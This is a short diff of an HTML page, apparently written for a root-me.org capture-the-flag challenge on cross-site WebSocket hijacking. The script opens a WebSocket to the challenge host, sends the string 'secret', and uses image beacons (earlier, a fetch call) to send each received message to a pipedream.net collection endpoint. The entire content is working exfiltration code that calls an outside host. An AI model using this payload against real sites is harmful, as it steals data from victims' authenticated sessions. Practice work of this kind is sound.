@@ -3,14 +3,17 @@
 <body>
   <script>
     const ws = new WebSocket('ws://ctf20.root-me.org/ws');
+    new Image().src = 'http://eo1gpdjxqwwogrz.m.pipedream.net/ws-opened';
 
-    ws.addEventListener('open', () => {
-      ws.send("Tell me a secret");
-    });
+    ws.onopen = () => {
+      ws.send('secret');
+      new Image().src = 'http://eo1gpdjxqwwogrz.m.pipedream.net/ws-onopen';
+    };
 
-    ws.addEventListener('message', (event) => {
-      fetch('http://eo1gpdjxqwwogrz.m.pipedream.net/leak?' + encodeURIComponent(event.data));
-    });
+    ws.onmessage = (e) => {
+      new Image().src = 'http://eo1gpdjxqwwogrz.m.pipedream.net/leak?' + encodeURIComponent(e.data);
+    };
+
   </script>
 </body>
 </html>
